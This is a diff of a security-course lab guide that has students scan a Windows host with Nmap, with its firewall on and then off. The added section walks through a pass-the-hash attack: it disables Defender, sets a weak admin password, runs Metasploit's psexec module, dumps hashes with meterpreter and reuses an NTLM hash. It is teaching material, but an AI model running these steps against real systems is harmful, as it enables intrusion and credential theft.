@@ -1,114 +1,201 @@
-
 # Host Firewalls and Nmap
 
-In this lab we will be scanning your Windows system from your Linux terminal with the firewall both on and off. 
+In this lab we will be scanning your **Windows** system from your **Linux** terminal with the firewall both on and off. 
 
 The goal is to show you how a system is very different to the network with a firewall enabled. 
 
 Remember, treat your internal network as hostile, because it is.
 
-Let's get started by opening a Terminal as Administrator:
+Let's get started by opening a command prompt terminal. You can do this by clicking the icon in the taskbar.
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+![](attachments/openingcommandprompt%20-%20Copy.png)
 
-Now, let's open a command Prompt:
+From the command prompt we need to get the IP address of **your** Windows system:
 
-![](attachments/Clipboard_2020-06-16-09-53-18.png)
+<pre>ipconfig</pre>
 
-####NOTE##### 
+![](attachments/nmap_ipconfig.png)
 
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
+Please note your IP for **your** system. Mine is **"10.10.1.209"**. 
 
- 
+**Yours will be different.**
 
-Simply click the Windows Start button in the lower left of your screen and type: 
+Let’s try and scan your Windows system from within a **Kali** terminal. Go ahead and open a **Kali** terminal up.
 
- 
+![](attachments/OpeningKaliInstance.png)
 
-`Powershell` 
+Alternatively, you can click on the **Kali** logo in the taskbar.
 
-or 
+![](attachments/TaskbarKaliIcon.png)
 
-`Ubuntu`
+In the **Kali** terminal, let’s become root:
 
-or 
+<pre>sudo su -</pre>
 
-`Command Prompt` 
+We will scan your Windows system:
 
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
-
-From the command prompt we need to get the IP address of your Windows system:
-
-
-
-C:\Users\adhd>`ipconfig`
-
-![](attachments/Clipboard_2020-07-07-15-24-29.png)
-
-Please note your IP for your WSL address.  Mine is 172.26.176.1.  Yours will be different.
-
-
-Now, let’s try and scan your Windows system from Ubuntu.  To do this open a Ubuntu command prompt:
-
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
-
-Next, let’s become root:
-
-adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ `sudo su -`
-
-Then, we will scan your Windows system:
-
-root@DESKTOP-I1T2G01:~# `nmap 172.26.176.1`
+<pre>nmap 10.10.1.209</pre>
 
 You can hit the spacebar to get status.
 
 It should look like this:
 
-![](attachments/Clipboard_2020-07-07-15-34-15.png)
+![](attachments/nmap_nmap.png)
 
-Please note the open ports. These are ports and services that an attacker could use to authenticate to your system.  Or, attack if an exploit is available. 
+Please note the open ports. These are ports and services that an attacker could use to authenticate to your system or attack if an exploit is available. 
 
+Go back to the **Windows** command prompt.  
 
-Now, let’s go back to the Windows command prompt, by selecting the Administrator: Command Prompt tab.
+![](attachments/openingcommandprompt%20-%20Copy.png)
 
-![](attachments/Clipboard_2020-07-07-15-31-07.png)
+Let’s enable the Windows firewall:
 
-Now, let’s enable the Windows firewall:
+<pre>netsh advfirewall set allprofiles state on</pre>
 
-Now turn it back on and rerun.
+![](attachments/nmap_advfirewallon.png)
 
-C:\Users\adhd>`netsh advfirewall set allprofiles state on`
+Now, let’s rescan from the **Kali** terminal.
 
-Now, let’s rescan from Linux.  Please select the Ubuntu tab:
+Rerun the scan: 
 
-![](attachments/Clipboard_2020-07-07-15-32-44.png)
+<pre>nmap 10.10.1.209</pre>
 
-Then, rerun the scan
+Please note, you can just hit the up arrow key to view previously run commands.  
 
-root@DESKTOP-I1T2G01:~# `nmap 172.26.176.1`
-
-Please note, you can just hit the up arrow key.
-
-Once again, you can hit the spacebar to see status.
+You can hit the spacebar to see status.
 
 It should look like this:
 
-![](attachments/Clipboard_2020-07-07-15-30-16.png)
+![](attachments/nmap_nmapscanwfirewall.png)
+
+Now, using the same process as before, let’s disable the **Windows** firewall to go back to the base state:
+
+<pre>netsh advfirewall set allprofiles state off</pre>
+
+![](attachments/nmap_turnbackon.png)
 
 
-Now, let’s disable the Windows firewall to go back to the base state:
+Now, lets see why this is important with pass the hash.
 
-C:\Users\adhd>`netsh advfirewall set allprofiles state off`
+First lets configure the Windows system
 
-![](attachments/Clipboard_2020-07-07-15-34-15.png)
+Let's disable AV.
+
+PS C:\Users\Administrator> `Set-MpPreference -DisableRealtimeMonitoring $true`
+
+Next, let's make sure that firewall is off.
+
+PS C:\Users\Administrator> `netsh advfirewall set allprofiles state off`
+
+Now, let's set an easy password.  
+
+PS C:\Users\Administrator> `net user Administrator password1234`
+
+PS C:\Users\Administrator> `ipconfig`
+
+
+It should look like this:
+
+<img width="641" alt="image" src="https://github.com/user-attachments/assets/10ffe094-f254-451e-95eb-d830b044e9a6">
+
+Now, let's open a Kali terminal:
+
+<img width="42" alt="image" src="https://github.com/user-attachments/assets/c64ee4a9-a642-4128-bb84-9cbe016cc5ba">
+
+Become root:
+
+`sudo su -`
+
+Start Metasploit
+
+`msfconsole -q`
+
+<img width="770" alt="image" src="https://github.com/user-attachments/assets/d32ecb85-5873-478a-b270-fbaf33e11aec">
+
+In another Kali terminal, get your IP address
+
+`ifconfig`
+
+<img width="661" alt="image" src="https://github.com/user-attachments/assets/44e622e5-34b6-4f0e-8547-769e891152e5">
+
+msf6 > `use exploit/windows/smb/psexec`
+
+
+msf6 exploit(windows/smb/psexec) > `set RHOST 10.10.70.106`
+
+msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.117.128`
+
+
+msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
+
+msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`
+
+It should look lie this:
+
+<img width="1139" alt="image" src="https://github.com/user-attachments/assets/9eb2b530-b318-4636-a111-5d6cbe73a906">
+
+Now dump the password hashes:
+
+meterpreter > `hashdump`
+
+<img width="1139" alt="image" src="https://github.com/user-attachments/assets/b3bbe145-51ab-4029-aefe-e036351af4fa">
+
+meterpreter > exit -y
+
+
+msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:30ee6993157208a29fb730af8bcc3dfe`
+
+
+<img width="1143" alt="image" src="https://github.com/user-attachments/assets/14882bb7-6891-4898-8dea-bc8023fd5930">
+
+msf6 exploit(windows/smb/psexec) > `exploit`
+
+<img width="1096" alt="image" src="https://github.com/user-attachments/assets/a0025016-882b-409c-90e1-ade208a19f7e">
+
+Kill it
+
+
+meterpreter > `exit -y`
+
+
+
+Now, back at the Windows Powershell, re-enable your firewall
+
+
+PS C:\Users\Administrator> `netsh advfirewall set allprofiles state on`
+
+Then re-run the attack!!
+
+<img width="1142" alt="image" src="https://github.com/user-attachments/assets/0cf9fa38-e3e3-419c-a346-576c90f6074c">
 
 
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+***
+***Continuing on to the next Lab?***
+
+[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
+
+***Finished with the Labs?***
+
+
+Please be sure to destroy the lab environment!
+
+[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+
+---
 
